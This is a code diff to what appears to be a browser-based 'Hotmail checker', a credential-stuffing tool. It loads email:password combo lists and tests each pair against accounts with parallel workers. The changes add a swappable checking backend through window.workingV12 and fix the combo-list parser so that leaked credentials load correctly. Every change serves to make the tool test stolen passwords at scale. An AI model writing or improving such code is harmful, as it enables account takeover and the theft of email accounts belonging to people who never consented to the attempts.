@@ -1535,6 +1535,18 @@
             }
         }
 
+        async function runCheckerBackend(email, password) {
+            const customBackend = window.workingV12 && typeof window.workingV12.check === 'function'
+                ? window.workingV12
+                : null;
+
+            if (customBackend) {
+                return customBackend.check(email, password);
+            }
+
+            return checkHotmail(email, password);
+        }
+
         function worker() {
             while (isRunning && currentIndex < combos.length) {
                 const idx = currentIndex++;
@@ -1552,7 +1564,7 @@
                 addLog(`Checking: ${combo.email}`, 'info');
                 triggerStatsNeural();
                 
-                const result = await checkHotmail(combo.email, combo.password);
+                const result = await runCheckerBackend(combo.email, combo.password);
 
                 checked++;
                 triggerStatsNeural();
@@ -1607,9 +1619,13 @@
             text.split('\n').forEach(line => {
                 line = line.trim();
                 if (line && line.includes(':')) {
-                    const parts = line.split(':', 1);
-                    if (parts.length === 2) {
-                        combos.push({ email: parts[0].trim().toLowerCase(), password: parts[1].trim() });
+                    const splitIndex = line.indexOf(':');
+                    if (splitIndex > 0) {
+                        const email = line.slice(0, splitIndex).trim().toLowerCase();
+                        const password = line.slice(splitIndex + 1).trim();
+                        if (email && password) {
+                            combos.push({ email, password });
+                        }
                     }
                 }
             });
